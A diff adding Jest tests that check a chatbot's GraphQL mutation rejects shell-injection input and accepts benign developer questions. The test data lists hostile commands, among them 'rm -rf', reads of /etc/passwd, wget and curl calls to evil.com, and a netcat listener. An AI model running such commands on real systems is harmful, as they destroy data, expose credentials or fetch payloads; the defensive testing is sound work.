@@ -6,6 +6,7 @@ import jwt from 'jsonwebtoken';
 import config from '../../config/config';
 import bcrypt from 'bcryptjs';
 import { connectRedis, disconnectRedis, getRedisClient } from '../../services/redis';
+import { rateLimiter } from '../../services/rateLimiter';
 
 // Mock OpenAI service
 jest.mock('../../services/openai', () => ({
@@ -167,5 +168,108 @@ describe('Chatbot Resolvers', () => {
       expect(errors?.[0].message).toContain('Rate limit exceeded');
       expect(errors?.[0].extensions?.code).toBe('RATE_LIMITED');
     }
+  });
+
+  describe('Input Validation - Security Patterns', () => {
+    let freshUser: any;
+    let freshToken: string;
+
+    beforeAll(async () => {
+      // Create a fresh user for security tests to avoid rate limit issues
+      const passwordHash = await bcrypt.hash('Test1234!', 10);
+      freshUser = await User.create({
+        name: 'Security Test User',
+        email: 'security@example.com',
+        password: passwordHash,
+        role: UserRole.USER
+      });
+      
+      // Clear rate limits for this user using the correct prefixed key
+      await rateLimiter.reset(`chatbot:${freshUser._id}`);
+    });
+
+    const dangerousInputs = [
+      { input: 'cd /tmp; rm -rf *', reason: 'shell semicolon' },
+      { input: 'test | cat /etc/passwd', reason: 'pipe operator' },
+      { input: 'hello && wget http://evil.com', reason: 'AND operator with wget' },
+      { input: '$(cat /etc/passwd)', reason: 'command substitution' },
+      { input: 'test `whoami`', reason: 'backtick execution' },
+      { input: 'look at ../../../etc/passwd', reason: 'path traversal' },
+      { input: 'curl http://malware.com/payload', reason: 'curl with URL' },
+      { input: 'curl -X POST http://evil.com', reason: 'curl with flags' },
+      { input: 'bash -c "rm -rf /"', reason: 'bash execution context' },
+      { input: 'python -c "import os"', reason: 'python execution context' },
+      { input: 'perl -e "system(cmd)"', reason: 'perl one-liner' },
+      { input: 'eval(malicious)', reason: 'eval function' },
+      { input: 'exec(command)', reason: 'exec function' },
+      { input: 'test%00null', reason: 'null byte injection' },
+      { input: 'path%2f%2e%2e%2fetc', reason: 'URL-encoded traversal' },
+      { input: 'wget http://evil.com/malware', reason: 'wget download' },
+      { input: 'chmod 777 /etc/passwd', reason: 'chmod with permissions' },
+      { input: 'nc -lvp 4444', reason: 'netcat listener' },
+    ];
+
+    it.each(dangerousInputs)(
+      'should reject input containing $reason',
+      async ({ input }) => {
+        const context = { user: { id: freshUser._id, role: freshUser.role } };
+        const response = await executeOperation(
+          ASK_QUESTION_MUTATION,
+          { question: input },
+          context
+        );
+
+        expect(response.body.kind).toBe('single');
+        if (response.body.kind === 'single') {
+          const { errors, data } = response.body.singleResult;
+          // Dangerous input should be rejected - either by validation or shield
+          expect(errors).toBeDefined();
+          // The request should fail (no successful data)
+          expect(data?.askQuestion).toBeFalsy();
+        }
+      }
+    );
+
+    const safeInputs = [
+      'What programming languages do you know?',
+      'Tell me about your experience with React',
+      'How do you handle database connections?',
+      'What is your approach to testing?',
+      'Can you explain microservices architecture?',
+      // Developer questions about technologies (should NOT be blocked)
+      'What is your experience with Python?',
+      'Can you explain bash scripting?',
+      'Tell me about Perl regex',
+      'How do you use curl for API testing?',
+      'What is wget used for?',
+      'Explain the eval function in JavaScript',
+      'How does exec work in Node.js?',
+      'What are chmod permissions?',
+    ];
+
+    it.each(safeInputs)(
+      'should accept safe input: %s',
+      async (question) => {
+        // Clear rate limit before each safe input test using the correct prefixed key
+        await rateLimiter.reset(`chatbot:${freshUser._id}`);
+        
+        const context = { user: { id: freshUser._id, role: freshUser.role } };
+        const response = await executeOperation(
+          ASK_QUESTION_MUTATION,
+          { question },
+          context
+        );
+
+        expect(response.body.kind).toBe('single');
+        if (response.body.kind === 'single') {
+          const { data, errors } = response.body.singleResult;
+          // Should not have validation errors (may have rate limit errors which is fine)
+          const hasValidationError = errors?.some(e => 
+            e.message.includes('invalid characters or patterns')
+          );
+          expect(hasValidationError).toBeFalsy();
+        }
+      }
+    );
   });
 });
